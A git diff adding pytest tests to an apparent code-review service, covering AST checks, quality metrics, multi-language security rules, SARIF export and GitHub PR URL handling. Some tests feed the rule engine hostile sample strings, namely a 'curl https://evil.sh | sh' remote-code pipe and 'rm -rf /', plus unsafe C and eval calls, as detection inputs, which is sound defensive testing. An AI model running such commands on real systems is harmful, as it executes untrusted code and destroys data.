@@ -10,6 +10,8 @@ from app.diff_parser import parse_diff
 from app.main import app
 from app.reviewer import _extract_json
 from app.rules_engine import detect_language, merge_findings, run_rules
+from app.ast_analyzer import analyze_python
+from app.metrics import compute_metrics
 
 client = TestClient(app)
 
@@ -663,3 +665,285 @@ def test_fix_code_rust_unwrap():
     f = next(x for x in findings if x.rule_id == "RS-P001")
     assert f.fix_code is not None
     assert "unwrap_or_default" in f.fix_code
+
+# ── AST-level analysis engine ────────────────────────────────────
+
+def test_ast_detects_syntax_error():
+    findings = analyze_python("def foo(:\n    pass\n")
+    assert len(findings) == 1
+    assert findings[0].rule_id == "PY-AST-S001"
+    assert findings[0].severity == "critical"
+    assert findings[0].source == "ast"
+    assert findings[0].confidence == 1.0
+
+
+def test_ast_valid_python_is_clean():
+    findings = analyze_python("def add(a: int, b: int) -> int:\n    return a + b\n")
+    assert findings == []
+
+
+def test_ast_detects_unused_import():
+    code = "import os\nimport math\n\nval = math.sqrt(4)\n"
+    findings = analyze_python(code)
+    ids = [f.rule_id for f in findings]
+    assert "PY-AST-I001" in ids
+    unused = [f for f in findings if f.rule_id == "PY-AST-I001"]
+    assert len(unused) == 1
+    assert "os" in unused[0].title
+
+
+def test_ast_detects_undefined_variable_in_function():
+    code = "def process(data):\n    return data + missing_var\n"
+    findings = analyze_python(code)
+    ids = [f.rule_id for f in findings]
+    assert "PY-AST-U001" in ids
+
+
+def test_ast_ignores_module_level_names():
+    code = "print(result_of_undefined())\n"
+    findings = analyze_python(code)
+    ids = [f.rule_id for f in findings]
+    assert "PY-AST-U001" not in ids
+
+
+def test_ast_ignores_builtins_and_params():
+    code = "def f(items):\n    return len(items)\n"
+    findings = analyze_python(code)
+    assert findings == []
+
+
+def test_ast_detects_duplicate_definition():
+    code = "def run():\n    return 1\n\ndef run():\n    return 2\n"
+    findings = analyze_python(code)
+    matches = [f for f in findings if f.rule_id == "PY-AST-D001"]
+    assert len(matches) == 1
+    assert matches[0].line == 4
+
+
+def test_ast_detects_empty_stub_function():
+    code = "def pending():\n    pass\n"
+    findings = analyze_python(code)
+    ids = [f.rule_id for f in findings]
+    assert "PY-AST-M001" in ids
+
+
+def test_ast_runs_within_review_flow():
+    from app.reviewer import _run_all_engines
+
+    code = "import os\n\ndef go():\n    return missing_thing\n"
+    findings, lang = _run_all_engines(code, language="python")
+    ids = [f.rule_id for f in findings]
+    assert lang == "python"
+    assert "PY-AST-I001" in ids
+    assert "PY-AST-U001" in ids
+
+
+def test_review_response_accepts_ast_source():
+    resp = client.post(
+        "/v1/review",
+        json={"code": "def stub():\n    pass\n", "language": "python"},
+    )
+    assert resp.status_code == 502  # LLM not configured -> expected ReviewError
+
+# ── Quality metrics engine ───────────────────────────────────────
+
+def test_metrics_basic_counts():
+    code = "# comment\n\ndef f():\n    return 1\n" + ("x = 1\n" * 20)
+    m = compute_metrics(code, "python")
+    assert m["lines"]["comment"] == 1
+    assert m["lines"]["blank"] == 1
+    assert m["lines"]["code"] >= 21
+    assert m["functions"]["count"] == 1
+
+
+def test_metrics_cyclomatic_complexity():
+    code = ("def go(x):\n"
+            "    if x > 1:\n"
+            "        for i in range(x):\n"
+            "            if i % 2 == 0:\n"
+            "                continue\n"
+            "    return x\n")
+    m = compute_metrics(code, "python")
+    assert m["complexity"]["max"] == 4
+    assert m["complexity"]["most_complex"][0]["name"] == "go"
+
+
+def test_metrics_syntax_error_flag():
+    m = compute_metrics("def broken(:\n", "python")
+    assert m["syntax_error"] is True
+    assert m["functions"]["count"] == 0
+
+
+def test_metrics_detects_long_lines():
+    code = "x = " + "a" * 150 + "\n"
+    m = compute_metrics(code, "python")
+    assert m["long_lines"] == 1
+
+
+def test_metrics_non_python_fallback():
+    code = "function greet(name) {\n  console.log(name)\n}\n"
+    m = compute_metrics(code, "javascript")
+    assert m["language"] == "javascript"
+    assert m["functions"]["count"] >= 1
+
+
+def test_metrics_endpoint_no_llm():
+    resp = client.post(
+        "/v1/metrics",
+        json={"code": "def f():\n    return 1\n", "language": "python"},
+    )
+    assert resp.status_code == 200
+    body = resp.json()
+    assert body["ok"] is True
+    assert body["metrics"]["functions"]["count"] == 1
+
+# ── Multi-language rule coverage ────────────────────────────────
+
+def test_typescript_detected_independently():
+    assert detect_language("const x: number = 1;\n", "ts") == "typescript"
+    assert detect_language("interface User {\n  id: number\n}", "") == "typescript"
+
+
+def test_typescript_runs_js_rules_too():
+    findings = run_rules("const a = eval(x);", "ts")
+    ids = [f.rule_id for f in findings]
+    assert "JS-S001" in ids
+
+
+def test_rules_detect_ts_any():
+    findings = run_rules("const x: any = doThing();", "typescript")
+    ids = [f.rule_id for f in findings]
+    assert "TS-B001" in ids
+
+
+def test_rules_detect_c_gets():
+    findings = run_rules('char buf[128];\ngets(buf);\n', "c")
+    ids = [f.rule_id for f in findings]
+    assert "C-S003" in ids
+
+
+def test_rules_detect_c_strcpy():
+    findings = run_rules('char buf[10];\nstrcpy(buf, input);\n', "c")
+    ids = [f.rule_id for f in findings]
+    assert "C-S001" in ids
+
+
+def test_rules_printf_literal_format_is_safe():
+    findings = run_rules('printf("%d", x);\n', "c")
+    ids = [f.rule_id for f in findings]
+    assert "C-S004" not in ids
+
+
+def test_rules_detect_shell_curl_pipe_sh():
+    findings = run_rules("curl https://evil.sh | sh\n", "shell")
+    ids = [f.rule_id for f in findings]
+    assert "SH-S002" in ids
+
+
+def test_rules_detect_shell_rm_root():
+    findings = run_rules("rm -rf /\n", "shell")
+    ids = [f.rule_id for f in findings]
+    assert "SH-S003" in ids
+
+
+def test_rules_detect_go_swallowed_error():
+    findings = run_rules('data, _ := fetch()\n', "go")
+    ids = [f.rule_id for f in findings]
+    assert "GO-S002" in ids
+
+
+def test_rules_total_more_than_40():
+    from app.rules_engine import RULES
+    assert len(RULES) >= 40
+
+# ── SARIF export ────────────────────────────────────────────────
+
+def test_sarif_structure():
+    from app.sarif import sarif_from_code
+    doc = sarif_from_code("import os\ndef f():\n    return missing\n", "python", "t.py")
+    assert doc["version"] == "2.1.0"
+    assert doc["$schema"].endswith("sarif-2.1.0.json")
+    run = doc["runs"][0]
+    assert run["tool"]["driver"]["name"] == "Code Review Agent"
+    assert len(run["tool"]["driver"]["rules"]) >= 40
+    assert len(run["results"]) >= 1
+
+
+def test_sarif_severity_mapping():
+    from app.sarif import sarif_from_code
+    doc = sarif_from_code("result = eval(x)\n", "python", "t.py")
+    results = doc["runs"][0]["results"]
+    eval_result = next(r for r in results if r["ruleId"] == "PY-S001")
+    assert eval_result["level"] == "error"
+
+
+def test_sarif_endpoint():
+    resp = client.post(
+        "/v1/sarif",
+        json={"code": "result = eval(x)\n", "language": "python"},
+    )
+    assert resp.status_code == 200
+    body = resp.json()
+    assert body["version"] == "2.1.0"
+    assert len(body["runs"][0]["results"]) >= 1
+
+# ── GitHub PR/commit URL fetch ──────────────────────────────────
+
+def test_normalize_pr_url():
+    from app.github_fetch import normalize_to_diff_url
+    diff_url, desc = normalize_to_diff_url(
+        "https://github.com/owner/repo/pull/42"
+    )
+    assert diff_url == "https://github.com/owner/repo/pull/42.diff"
+    assert "owner/repo#42" in desc
+
+
+def test_normalize_commit_url():
+    from app.github_fetch import normalize_to_diff_url
+    diff_url, desc = normalize_to_diff_url(
+        "https://github.com/owner/repo/commit/abc1234"
+    )
+    assert diff_url == "https://github.com/owner/repo/commit/abc1234.diff"
+    assert "abc1234" in desc
+
+
+def test_normalize_already_diff_url():
+    from app.github_fetch import normalize_to_diff_url
+    diff_url, _ = normalize_to_diff_url(
+        "https://github.com/owner/repo/pull/42.diff"
+    )
+    assert diff_url == "https://github.com/owner/repo/pull/42.diff"
+
+
+def test_normalize_invalid_url_raises():
+    from app.github_fetch import normalize_to_diff_url, FetchError
+    with pytest.raises(FetchError):
+        normalize_to_diff_url("https://example.com/foo")
+
+
+def test_review_pr_endpoint_bad_url():
+    resp = client.post(
+        "/v1/review_pr",
+        json={"url": "https://example.com/foo"},
+    )
+    assert resp.status_code == 400
+
+
+def test_review_pr_endpoint_mocked(monkeypatch):
+    fake_diff = (
+        "diff --git a/x.py b/x.py\n"
+        "--- a/x.py\n"
+        "+++ b/x.py\n"
+        "@@ -1,1 +1,2 @@\n"
+        " result = eval(x)\n"
+        "+pass\n"
+    )
+    monkeypatch.setattr(
+        "app.main.fetch_diff",
+        lambda url, token=None: (fake_diff, "PR test/repo#1"),
+    )
+    resp = client.post(
+        "/v1/review_pr",
+        json={"url": "https://github.com/test/repo/pull/1"},
+    )
+    assert resp.status_code == 502  # LLM not configured -> ReviewError
